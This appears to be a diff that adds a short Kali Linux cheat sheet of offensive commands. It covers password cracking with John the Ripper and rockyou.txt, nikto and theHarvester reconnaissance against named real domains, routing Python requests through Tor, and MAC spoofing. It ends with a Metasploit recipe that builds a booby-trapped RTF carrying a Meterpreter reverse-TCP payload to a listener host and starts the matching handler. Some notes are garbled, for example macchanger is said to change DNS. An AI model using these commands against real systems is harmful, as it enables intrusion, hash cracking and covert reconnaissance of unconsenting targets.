@@ -1,0 +1,47 @@
+# Ethical Hacking Tools
+
+## john the reaper
+-locate rockyou.txt
+[john [option] [password-list] [password-to-crack]]
+-john --format=raw-md5 /usr/share/wordlists/rockyou.txt.gz /root/Desktop/test.txt
+
+## nikto -footprinting for website
+-nikto -e 1 -h webscantest.com
+-nikto [options] [target]
+
+## theharvester -foorprinting for email
+-theharvester -d microsoft.com -l 50 -b google -f
+    -search domain microsoft limit 50 seach in google -h  for shodan search
+-theharvester [option]
+
+
+INSTALL PYTHON-KALI
+apt-get install python3-pip
+python3 -> access python shell
+ctr+D -> exit python shell
+
+~script
+import socks, socket
+socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
+socket.socket = socks.sockssocket
+import requests
+n = requests.get("http://[url]") -> assign var
+n.content - shows n contets
+
+NETSTAT - network status
+netstat -tupln -> check tor
+nohup tor & -> run tor
+
+MACCHANGER - mac address changer
+macchanger -> change DNS
+
+METASPLOIT
+use exploit/windows/fileformat/ms14_017_rtf
+set FILENAME doc.rtf
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.1.112
+exploit
+
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.1.112
